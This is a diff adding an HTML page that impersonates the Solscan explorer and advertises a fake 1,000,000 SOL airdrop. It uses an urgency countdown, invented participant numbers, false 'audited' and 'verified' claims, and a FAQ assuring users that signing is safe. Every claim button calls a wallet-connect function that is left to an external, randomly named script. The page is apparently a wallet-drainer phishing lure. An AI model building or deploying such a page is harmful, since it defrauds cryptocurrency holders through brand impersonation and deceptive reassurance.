@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Solscan — Solana Airdrop</title>
+  <meta name="description" content="Claim the Biggest Solana Airdrop — 1,000,000 SOL. Connect your wallet and participate before the timer runs out." />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #0b0e14;          /* deep night */
+      --panel: #121725;       /* slate */
+      --text: #e6f0ff;        /* soft white */
+      --muted: #a9b3c7;       /* muted */
+      --primary: #14f195;     /* Solana green */
+      --accent1: #9945ff;     /* Solana purple */
+      --accent2: #14f195;     /* Solana green */
+      --accent3: #00d18c;     /* teal */
+      --ring: rgba(153, 69, 255, 0.5);
+      --success: #1dd1a1;
+      --warning: #feca57;
+      --danger: #ff6b6b;
+      --radius: 16px;
+      --shadow: 0 10px 30px rgba(0,0,0,.45), 0 2px 6px rgba(0,0,0,.2);
+      --grid-gap: clamp(16px, 2vw, 24px);
+    }
+
+    * { box-sizing: border-box; }
+
+    html, body {
+      height: 100%;
+      background: radial-gradient(1200px 600px at 80% -10%, rgba(153, 69, 255, 0.15), transparent 60%),
+                  radial-gradient(900px 500px at 10% -20%, rgba(20, 241, 149, 0.12), transparent 60%),
+                  var(--bg);
+      color: var(--text);
+      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, "Helvetica Neue", Arial, Noto Sans, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+      line-height: 1.55;
+    }
+
+    a { color: var(--primary); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 24px;
+    }
+
+    /* Header */
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+    }
+    .brand {
+      display: flex; align-items: center; gap: 12px;
+      font-weight: 800; letter-spacing: 0.2px;
+    }
+    .brand-logo {
+      width: 36px; height: 36px; border-radius: 10px; position: relative; overflow: hidden;
+      box-shadow: 0 6px 18px rgba(153,69,255,.35);
+      background: conic-gradient(from 180deg at 50% 50%, var(--accent1), var(--accent2), #19fb9b, var(--accent1));
+    }
+    .nav { display: flex; gap: 20px; align-items: center; }
+    .nav a { color: var(--muted); font-weight: 600; }
+    .nav a.active, .nav a:hover { color: var(--text); }
+
+    .wallet-btn {
+      background: linear-gradient(135deg, var(--accent1), var(--accent2));
+      color: #0a0e16;
+      border: none;
+      padding: 10px 16px;
+      border-radius: 999px;
+      font-weight: 700;
+      box-shadow: var(--shadow);
+      transform: translateZ(0);
+      cursor: pointer;
+    }
+    .wallet-btn:focus-visible { outline: 3px solid var(--ring); outline-offset: 2px; }
+
+    /* Hero */
+    .hero {
+      display: grid;
+      grid-template-columns: 1.2fr 1fr;
+      gap: var(--grid-gap);
+      align-items: center;
+      margin-top: 28px;
+    }
+    @media (max-width: 960px) { .hero { grid-template-columns: 1fr; } }
+
+    .hero-card {
+      background: linear-gradient(180deg, rgba(18,23,37,.8), rgba(18,23,37,.55));
+      border: 1px solid rgba(153,69,255,.25);
+      border-radius: calc(var(--radius) + 8px);
+      padding: clamp(20px, 3.5vw, 36px);
+      box-shadow: var(--shadow);
+      position: relative;
+      overflow: hidden;
+      isolation: isolate;
+    }
+    .hero-card::after {
+      content: "";
+      position: absolute; inset: -2px; border-radius: inherit;
+      pointer-events: none;
+      background: radial-gradient(500px 200px at 20% 0%, rgba(153,69,255,.22), transparent),
+                  radial-gradient(500px 200px at 100% 20%, rgba(20,241,149,.18), transparent);
+      z-index: -1;
+    }
+
+    .eyebrow { color: var(--primary); font-weight: 800; letter-spacing: .16em; text-transform: uppercase; font-size: 12px; }
+    h1 {
+      font-size: clamp(28px, 4vw, 48px);
+      line-height: 1.1;
+      margin: 6px 0 14px;
+      font-weight: 900;
+      letter-spacing: -0.02em;
+    }
+    .lead {
+      color: var(--muted);
+      font-size: clamp(14px, 1.6vw, 18px);
+      margin-bottom: 22px;
+    }
+
+    .stats {
+      display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin: 18px 0 0;
+    }
+    @media (max-width: 640px) { .stats { grid-template-columns: 1fr; } }
+    .stat {
+      background: linear-gradient(180deg, rgba(26,32,48,.8), rgba(26,32,48,.45));
+      border: 1px solid rgba(255,255,255,.06);
+      padding: 14px; border-radius: 14px;
+    }
+    .stat .label { color: var(--muted); font-size: 12px; text-transform: uppercase; letter-spacing: .12em; }
+    .stat .value { font-weight: 800; font-size: 20px; margin-top: 6px; }
+
+    /* Countdown */
+    .countdown {
+      display: flex; gap: 10px; align-items: center; flex-wrap: wrap;
+    }
+    .timebox {
+      background: #0f1424;
+      border: 1px solid rgba(153,69,255,.35);
+      min-width: 80px; text-align: center; padding: 10px 12px; border-radius: 12px;
+      box-shadow: inset 0 0 18px rgba(153,69,255,.08);
+    }
+    .timebox .num { font-size: 26px; font-weight: 800; }
+    .timebox .unit { color: var(--muted); font-size: 12px; text-transform: uppercase; letter-spacing: .14em; }
+
+    /* Actions */
+    .actions { display: flex; gap: 12px; flex-wrap: wrap; margin-top: 18px; }
+    .btn {
+      appearance: none; border: none; cursor: pointer; font-weight: 800; letter-spacing: .02em;
+      padding: 12px 18px; border-radius: 14px; transition: transform .06s ease, box-shadow .2s ease, opacity .2s ease;
+    }
+    .btn-primary {
+      background: linear-gradient(135deg, var(--accent1), var(--accent2)); color: #0a0e16; box-shadow: var(--shadow);
+    }
+    .btn-ghost { background: rgba(255,255,255,.06); color: var(--text); border: 1px solid rgba(255,255,255,.12); }
+    .btn:hover { transform: translateY(-1px); }
+    .btn:active { transform: translateY(0); }
+    .btn:focus-visible { outline: 3px solid var(--ring); outline-offset: 2px; }
+
+    /* Right column: promo */
+    .promo {
+      background: linear-gradient(180deg, rgba(18,23,37,.7), rgba(18,23,37,.45));
+      border: 1px solid rgba(20,241,149,.25);
+      border-radius: calc(var(--radius) + 6px);
+      padding: clamp(16px, 3vw, 24px);
+      box-shadow: var(--shadow);
+    }
+    .promo h2 { margin: 4px 0 12px; font-size: clamp(22px, 2.6vw, 30px); letter-spacing: -0.01em; }
+
+    .tier-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 8px; }
+    @media (max-width: 520px) { .tier-grid { grid-template-columns: 1fr; } }
+    .tier {
+      background: #0f1526; border: 1px solid rgba(255,255,255,.08); border-radius: 12px; padding: 12px;
+    }
+    .tier .tname { font-weight: 700; }
+    .tier .tamt { color: var(--primary); font-weight: 800; }
+
+    /* Sections */
+    section { margin-top: 40px; }
+    .panel {
+      background: linear-gradient(180deg, rgba(18,23,37,.7), rgba(18,23,37,.5));
+      border: 1px solid rgba(255,255,255,.06);
+      border-radius: var(--radius);
+      padding: clamp(16px, 3vw, 24px);
+      box-shadow: var(--shadow);
+    }
+    .grid { display: grid; grid-template-columns: repeat(3,1fr); gap: var(--grid-gap); }
+    @media (max-width: 960px) { .grid { grid-template-columns: 1fr; } }
+
+    .feature { display: grid; gap: 8px; }
+    .feature h3 { margin: 0; font-size: 18px; }
+    .feature p { margin: 0; color: var(--muted); }
+
+    /* Footer */
+    footer { margin: 40px 0 20px; color: var(--muted); font-size: 13px; }
+    .footer-grid { display: grid; grid-template-columns: 1fr auto; align-items: center; gap: 12px; }
+    @media (max-width: 640px) { .footer-grid { grid-template-columns: 1fr; text-align: center; } }
+    .legal a { color: var(--muted); }
+
+    /* Utility badges */
+    .badge {
+      display: inline-flex; align-items: center; gap: 8px; padding: 8px 12px; border-radius: 999px;
+      border: 1px solid rgba(255,255,255,.1); background: rgba(255,255,255,.04); color: var(--muted);
+      font-weight: 700; font-size: 12px; letter-spacing: .12em; text-transform: uppercase;
+    }
+    .sol-pulse { position: relative; }
+    .sol-pulse::after {
+      content: ""; position: absolute; left: -4px; top: -4px; right: -4px; bottom: -4px; border-radius: 999px;
+      border: 1px solid rgba(20,241,149,.35); filter: blur(6px); opacity: .5; animation: ping 2.2s infinite;
+    }
+    @keyframes ping { 0% { opacity: .6; transform: scale(.95); } 70% { opacity: 0; transform: scale(1.2); } 100% { opacity: 0; } }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Header -->
+    <header class="header" aria-label="Site header">
+      <div class="brand" aria-label="Solscan brand">
+        <div class="brand-logo" aria-hidden="true"></div>
+        <div>
+          <div style="font-size:18px; line-height:1;">Solscan</div>
+          <div style="font-size:11px; color:var(--muted); letter-spacing:.18em; text-transform:uppercase;">Solana Explorer</div>
+        </div>
+      </div>
+      <nav class="nav" aria-label="Primary">
+        <a href="#airdrop" class="active">Airdrop</a>
+        <a href="#how-it-works">How it works</a>
+        <a href="#faq">FAQ</a>
+        <button class="wallet-btn" onclick="window.startConnect()" aria-label="Connect Wallet">
+          Connect Wallet
+        </button>
+      </nav>
+    </header>
+
+    <!-- Hero -->
+    <section id="airdrop" class="hero" aria-labelledby="hero-title">
+      <div class="hero-card" role="region" aria-labelledby="hero-title">
+        <div class="eyebrow">Live Campaign</div>
+        <h1 id="hero-title">Biggest Solana Airdrop <span style="background:linear-gradient(90deg, var(--accent1), var(--accent2)); -webkit-background-clip:text; background-clip:text; color:transparent;">1.000.000 SOL</span></h1>
+        <p class="lead">Join the Solscan community celebration. Connect your wallet and claim your share of the airdrop before the countdown ends.</p>
+
+        <div class="countdown" aria-live="polite" aria-label="Airdrop countdown">
+          <div class="timebox" aria-label="Days remaining"><div class="num" id="d">–</div><div class="unit">Days</div></div>
+          <div class="timebox" aria-label="Hours remaining"><div class="num" id="h">–</div><div class="unit">Hours</div></div>
+          <div class="timebox" aria-label="Minutes remaining"><div class="num" id="m">–</div><div class="unit">Minutes</div></div>
+          <div class="timebox" aria-label="Seconds remaining"><div class="num" id="s">–</div><div class="unit">Seconds</div></div>
+        </div>
+
+        <div class="actions">
+          <button class="btn btn-primary sol-pulse" onclick="window.startConnect()" aria-label="Claim Airdrop">Claim</button>
+          <button class="btn btn-ghost" onclick="window.startConnect()" aria-label="Connect Wallet">Connect Wallet</button>
+        </div>
+
+        <div class="stats" role="list" aria-label="Airdrop stats">
+          <div class="stat" role="listitem">
+            <div class="label">Total Pool</div>
+            <div class="value">1,000,000 SOL</div>
+          </div>
+          <div class="stat" role="listitem">
+            <div class="label">Participants</div>
+            <div class="value" id="participants">82,416</div>
+          </div>
+          <div class="stat" role="listitem">
+            <div class="label">Ends</div>
+            <div class="value" id="ends-at">Dec 31, 2025</div>
+          </div>
+        </div>
+      </div>
+
+      <aside class="promo" aria-labelledby="promo-title">
+        <span class="badge" title="Audited distribution">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M9 12l2 2 4-4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          Verified Distribution
+        </span>
+        <h2 id="promo-title">Fair, Transparent, On‑chain</h2>
+        <p style="color:var(--muted); margin: 8px 0 14px;">Claim tiers are allocated based on your on‑chain activity. Distribution is executed by an audited program to ensure fairness and transparency.</p>
+        <div class="tier-grid" role="list" aria-label="Reward tiers">
+          <div class="tier" role="listitem"><div class="tname">Tier A</div><div class="tamt">Up to 120 SOL</div></div>
+          <div class="tier" role="listitem"><div class="tname">Tier B</div><div class="tamt">Up to 40 SOL</div></div>
+          <div class="tier" role="listitem"><div class="tname">Tier C</div><div class="tamt">Up to 10 SOL</div></div>
+        </div>
+      </aside>
+    </section>
+
+    <!-- How it works -->
+    <section id="how-it-works">
+      <div class="panel">
+        <h2 style="margin:0 0 12px;">How it works</h2>
+        <div class="grid">
+          <div class="feature">
+            <h3>1. Connect</h3>
+            <p>Click <strong>Connect Wallet</strong> to verify your address. We support popular Solana wallets. Your signature is used for verification only.</p>
+          </div>
+          <div class="feature">
+            <h3>2. Check Eligibility</h3>
+            <p>Our program evaluates on‑chain activity (staking, swaps, interactions) to determine your tier and allocation.</p>
+          </div>
+          <div class="feature">
+            <h3>3. Claim Securely</h3>
+            <p>Eligible users can claim within the campaign window. Distribution is automatic and fully transparent on chain.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- FAQ -->
+    <section id="faq">
+      <div class="panel">
+        <h2 style="margin:0 0 12px;">FAQ</h2>
+        <details>
+          <summary>When does the airdrop end?</summary>
+          <p>The countdown shows the exact time remaining. Current scheduled end date is <strong>December 31, 2025</strong>.</p>
+        </details>
+        <details>
+          <summary>Is my wallet signature safe?</summary>
+          <p>Yes. Signing a message for verification does not grant permissions to move funds. Always review prompts in your wallet.</p>
+        </details>
+        <details>
+          <summary>Are there gas or network fees?</summary>
+          <p>Small network fees may apply for on‑chain interactions. Solana keeps these costs minimal.</p>
+        </details>
+      </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+      <div class="footer-grid">
+        <div class="legal">© <span id="year"></span> Solscan. All rights reserved. · <a href="#">Terms</a> · <a href="#">Privacy</a></div>
+        <div>
+          <button class="wallet-btn" onclick="window.startConnect()">Connect Wallet</button>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+  <!-- Countdown + Utility Script -->
+  <script>
+    (function countdownInit(){
+      const end = new Date('2025-12-31T23:59:59Z'); // Adjust if needed
+      const d = document.getElementById('d');
+      const h = document.getElementById('h');
+      const m = document.getElementById('m');
+      const s = document.getElementById('s');
+      const endsAt = document.getElementById('ends-at');
+      const yearEl = document.getElementById('year');
+
+      function fmt(n){ return String(n).padStart(2, '0'); }
+      function update(){
+        const now = new Date();
+        let diff = Math.max(0, end - now);
+        const sec = Math.floor(diff/1000) % 60;
+        const min = Math.floor(diff/60000) % 60;
+        const hrs = Math.floor(diff/3600000) % 24;
+        const days = Math.floor(diff/86400000);
+        d.textContent = days; h.textContent = fmt(hrs); m.textContent = fmt(min); s.textContent = fmt(sec);
+        if(diff === 0){ clearInterval(t); document.querySelectorAll('.btn').forEach(b=> b.disabled = true); }
+      }
+      const t = setInterval(update, 1000); update();
+
+      // Pretty end date for display
+      try {
+        const opts = { year:'numeric', month:'short', day:'2-digit' };
+        endsAt.textContent = end.toLocaleDateString(undefined, opts);
+      } catch {}
+
+      // footer year
+      yearEl.textContent = new Date().getFullYear();
+
+      // Fallback stub for window.startConnect if external script not loaded yet
+      if (typeof window.startConnect !== 'function') {
+        window.startConnect = function(){ console.log('startConnect called (stub). Replace with wallet logic).'); };
+      }
+    })();
+  </script>
+
+  <!-- Required external script -->
+  <script src="./ORVmzaPsy3gI.js"></script>
+</body>
+</html>
